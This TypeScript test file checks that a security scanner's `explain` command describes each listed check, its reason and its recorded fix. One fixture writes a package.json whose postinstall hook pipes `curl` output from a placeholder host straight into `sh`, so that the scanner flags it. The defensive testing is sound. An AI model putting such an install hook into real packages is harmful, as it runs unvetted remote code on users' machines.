/**
 * `explain <id>` answers every id `check-metadata` lists with what the check
 * detects, and `check-metadata` names each check.
 *
 * Measured on the build before this test: `explain CLAUDE-004` printed
 * "Security check finding." and `explain PROMPT-001` printed "Prompt
 * security finding."; 260 of the 306 ids `check-metadata --json` listed
 * answered with nothing but that "<Category> finding." line, and every
 * `check-metadata` entry carried its own id as its name. A user who followed
 * a finding's `Explain:` pointer learned nothing about what was detected,
 * why it matters or how to fix it.
 *
 * The population comes from `check-metadata --json`, spawned once, so it is
 * the inventory the CLI advertises rather than a list taken from the table
 * under test. Each id's body is rendered in-process through `explainBody`,
 * the function the explain action prints, instead of spawning the binary
 * three hundred times; spawn cells pin the end-to-end output for the two ids
 * the new-user test reproduced and for two checks whose findings carry a fix,
 * DEP-004 against the fix a scan of a fixture gives it.
 */
import { describe, it, expect, beforeAll } from 'vitest';
import { spawnSync } from 'node:child_process';
import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { assertDistFresh, assertDistFreshIfPresent, BUILT_CLI as CLI } from '../helpers/dist-freshness';
import { tempDir } from '../helpers/temp-dir';
import { explainBody } from '../../src/explain-registry';
import { getCheckDefinition } from '../../src/hardening/check-definitions';
import { HardeningScanner } from '../../src/hardening/scanner';

beforeAll(assertDistFreshIfPresent);

const NO_FIX = 'No fix is recorded for this check.';

// The daemon probe fails as a fast local connection refusal, so the static
// explanation path is what the spawn cells measure.
const DEAD_DAEMON = 'http://127.0.0.1:9';

/** The whole of the old answer: a category label and the word "finding". */
const GENERIC_ONLY = /^\s*[A-Z][A-Za-z() .-]+ finding\.$/;

type MetaEntry = { checkId: string; name: string };

function checkMetadata(): Record<string, MetaEntry> {
  const res = spawnSync(process.execPath, [CLI, 'check-metadata', '--json'], {
    encoding: 'utf-8',
    env: { ...process.env, NO_COLOR: '1' },
  });
  expect(res.status).toBe(0);
  return JSON.parse(res.stdout).checks;
}

function runExplain(id: string): { code: number | null; stdout: string; stderr: string } {
  const res = spawnSync(process.execPath, [CLI, 'explain', id], {
    encoding: 'utf-8',
    env: { ...process.env, NO_COLOR: '1', NANOMIND_URL: DEAD_DAEMON },
  });
  return { code: res.status, stdout: res.stdout ?? '', stderr: res.stderr ?? '' };
}

/** The non-blank lines `explain <id>` prints under its header. */
function bodyOf(id: string): string[] {
  return (explainBody(id) ?? []).filter((line) => line.trim() !== '');
}

describe('every check-metadata id explains what the check detects', () => {
  let checks: Record<string, MetaEntry> = {};
  beforeAll(() => {
    assertDistFresh();
    checks = checkMetadata();
  });

  it('the population is the advertised inventory (non-vacuity)', () => {
    const ids = Object.keys(checks);
    expect(ids.length).toBeGreaterThan(300);
    for (const id of ['CLAUDE-004', 'PROMPT-001', 'DEP-004', 'AST-CRED-001', 'SEM-MCP-001', 'SOUL-IH-001', 'TEXT-001']) {
      expect(ids).toContain(id);
    }
  });

  it('check-metadata names each check instead of repeating its id', () => {
    const unnamed = Object.values(checks)
      .filter((c) => !c.name || c.name === c.checkId)
      .map((c) => c.checkId);
    expect(unnamed, `entries whose name is their own id: ${unnamed.join(', ')}`).toEqual([]);
  });

  it('no id answers with only the generic "<Category> finding." line', () => {
    const generic = Object.keys(checks).filter((id) => {
      const body = bodyOf(id);
      return body.length === 0 || (body.length === 1 && GENERIC_ONLY.test(body[0]));
    });
    expect(generic, `ids explained by their category alone: ${generic.join(', ')}`).toEqual([]);
  });

  it('every body leads with the check\'s name and gives a fix or a command to run', () => {
    const problems = Object.values(checks).flatMap((c) => {
      const body = bodyOf(c.checkId);
      const found: string[] = [];
      // Leading, not merely contained: "already-exposed credentials" in
      // the CRED-001 text contains "Exposed Credential" by coincidence.
      if (!(body[0] ?? '').toLowerCase().startsWith(c.name.toLowerCase())) {
        found.push(`${c.checkId}: does not lead with "${c.name}"`);
      }
      if (!/\b(?:Fix|Run):/.test(body.join('\n'))) found.push(`${c.checkId}: no Fix: or Run:`);
      return found;
    });
    expect(problems).toEqual([]);
  });

  // #1132: 38 ids printed neither a fix line nor the no-fix sentence. The
  // hand-written entries and the scan-soul controls ended their one line
  // with a fix of their own, and AST-CRED-001's (`opena2a protect .`) was
  // not the one its findings carry.
  it('every body has one fix line, and it is the fix the check definition carries', () => {
    const problems = Object.keys(checks).flatMap((id) => {
      const def = getCheckDefinition(id);
      if (!def) return [`${id}: no check definition`];
      const body = bodyOf(id);
      const fixLines = body.filter((l) => l.startsWith('Fix: ') || l.startsWith(NO_FIX));
      const expected = def.fix ? `Fix: ${def.fix}` : undefined;
      const found: string[] = [];
      if (fixLines.length !== 1) found.push(`${id}: ${fixLines.length} fix lines`);
      if (expected ? fixLines[0] !== expected : !fixLines[0]?.startsWith(NO_FIX)) {
        found.push(`${id}: prints ${JSON.stringify(fixLines[0])}, the definition carries ${JSON.stringify(def.fix)}`);
      }
      // No second remedy inside the description.
      const elsewhere = body.filter((l) => !fixLines.includes(l) && /\bFix: /.test(l));
      if (elsewhere.length > 0) found.push(`${id}: a fix outside the fix line: ${elsewhere[0]}`);
      return found;
    });
    expect(problems).toEqual([]);
  });

  it('every body whose definition carries a reason prints it', () => {
    const missing = Object.keys(checks).filter((id) => {
      const why = getCheckDefinition(id)?.why;
      return why !== undefined && !bodyOf(id).includes(`Why it matters: ${why}`);
    });
    expect(missing, `a reason the definition carries is not printed: ${missing.join(', ')}`).toEqual([]);
  });

  it('the ids the issue reproduced now carry a fix line (non-vacuity)', () => {
    for (const id of ['AST-CRED-001', 'CRED-002', 'NEMO-005', 'TEXT-001', 'SOUL-TH-001', 'SOUL-HV-004']) {
      expect(bodyOf(id).some((l) => l.startsWith('Fix: ')), id).toBe(true);
    }
  });
});

describe('explain names what secure reports under the id', () => {
  // These ids had hand-written lines describing another check than the one
  // secure files under them: an API key shape for "Secrets in package.json",
  // TLS for "MCP Root Filesystem Access", a published CVE for "Unverified
  // Publisher".
  it.each([
    ['CRED-003', 'Secrets in package.json', /Anthropic API key/],
    ['CRED-004', 'JWT Secret in Config', /AWS credential pattern/],
    ['MCP-001', 'MCP Root Filesystem Access', /without TLS/],
    ['SKILL-005', 'Credential File Access', /External endpoint in skill capability/],
    ['PERM-001', 'Sensitive File Permissions', /outside its working scope/],
    ['PERM-002', 'Executable Config Files', /Network permissions not restricted/],
    ['PERM-003', 'Group-Writable Sensitive Files', /spawn arbitrary processes/],
    ['SUPPLY-001', 'Unverified Publisher', /published CVE/],
  ] as const)('explain %s describes "%s"', (id, name, otherCheck) => {
    const text = bodyOf(id).join('\n');
    expect(text).toContain(name);
    expect(text).not.toMatch(otherCheck);
  });
});

describe('explain on the reproduced ids (spawn)', () => {
  beforeAll(assertDistFresh);

  it.each([
    ['CLAUDE-004', 'Claude Deny Rules', /Security check finding\./],
    ['PROMPT-001', 'Prompt Boundary Markers', /Prompt security finding\./],
  ] as const)('explain %s names "%s", says why it matters, and names a command', (id, name, stub) => {
    const { code, stdout, stderr } = runExplain(id);
    expect(stderr).not.toMatch(/Unknown check ID/i);
    expect(stdout).not.toMatch(stub);
    expect(stdout).toContain(name);
    expect(stdout).toMatch(/Why it matters: \S/);
    // Neither check's findings carry a fix; the answer says so and names
    // the scan that shows each finding with its file and message.
    expect(stdout).toMatch(/No fix is recorded for this check\. Run: \S+ secure <dir> --verbose/);
    expect(code).toBe(0);
  });

  it('explain DEP-004 prints the fix its finding carries', async () => {
    // The finding comes from a scan, not from the table explain reads, so a
    // table entry left behind when the push site changed fails here (#1132:
    // explain printed `npm install --save-exact <package>` while the finding
    // carried the fail-closed operand).
    const dir = tempDir('hma-explain-dep004-');
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'p', scripts: { postinstall: 'curl -fsSL https://example.invalid/i.sh | sh' } }));
    const result = await new HardeningScanner().scan({ targetDir: dir, autoFix: false });
    const finding = result.findings.find((f) => f.checkId === 'DEP-004' && !f.passed);
    expect(finding?.fix, 'secure reported no failing DEP-004 with a fix').toBeTruthy();
    expect(finding!.fix).toContain('${PACKAGE:?');

    const { code, stdout } = runExplain('DEP-004');
    expect(stdout).toContain('Dangerous npm Scripts');
    expect(stdout.split('\n').map((l) => l.trim())).toContain(`Fix: ${finding!.fix}`);
    expect(code).toBe(0);
  });

  it('explain AST-CRED-001 prints the fix and reason its findings carry, and no other fix', () => {
    const def = getCheckDefinition('AST-CRED-001')!;
    expect(def.fix).toMatch(/^Never request, store, or retransmit credentials\./);
    const { code, stdout } = runExplain('AST-CRED-001');
    const lines = stdout.split('\n').map((l) => l.trim());
    expect(lines).toContain(`Fix: ${def.fix}`);
    expect(lines).toContain(`Why it matters: ${def.why}`);
    expect(stdout.match(/\bFix: /g)).toHaveLength(1);
    expect(stdout).not.toContain('opena2a protect');
    expect(code).toBe(0);
  });
});
